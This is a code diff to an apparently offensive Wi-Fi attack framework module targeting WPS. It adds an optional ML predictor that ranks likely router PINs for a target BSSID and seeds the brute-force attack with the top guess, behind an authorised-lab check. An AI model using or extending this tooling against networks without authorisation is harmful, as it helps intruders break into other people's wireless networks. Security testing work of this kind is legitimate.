@@ -26,6 +26,12 @@ from wirelessxpl.core.exploit import *
 
 from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab
 
+try:
+    from wirelessxpl.core.ml.wps_pin_predictor import WPSPINPredictor
+    _HAS_PIN_ML = True
+except ImportError:
+    _HAS_PIN_ML = False
+
 logger = logging.getLogger(__name__)
 
 
@@ -57,6 +63,7 @@ class Exploit(Exploit):
     timeout = OptInteger(300, "Timeout in seconds per attempt")
     verbose = OptBool(False, "Enable verbose output from tools")
     output_dir = OptString(".log", "Directory for results and captures")
+    ml_pin_predict = OptBool(True, "ML-assisted PIN prediction (prioritize likely PINs)")
     dry_run = OptBool(False, "Print command without executing")
 
     def _run_wash_scan(self) -> None:
@@ -218,6 +225,22 @@ class Exploit(Exploit):
         if not self.target_bssid or self.target_bssid == "FF:FF:FF:FF:FF:FF":
             print_error("target_bssid is required. Run wash_scan first to discover targets.")
             return
+
+        if self.ml_pin_predict and _HAS_PIN_ML and self.mode == "pin_bruteforce" and not self.pin:
+            try:
+                predictor = WPSPINPredictor()
+                predictions = predictor.predict(self.target_bssid)
+                if predictions:
+                    print_info("ML PIN predictions (most likely first):")
+                    for p in predictions[:5]:
+                        print_info("  PIN {} — confidence {:.0%} ({})".format(
+                            p.pin, p.confidence, p.method))
+                    best = predictions[0]
+                    self.pin = best.pin
+                    print_status("Using ML-predicted PIN: {} ({:.0%})".format(
+                        best.pin, best.confidence))
+            except Exception as exc:
+                logger.debug("ML PIN prediction failed: %s", exc)
 
         if self.mode == "pixie_dust":
             self._run_pixie_dust()
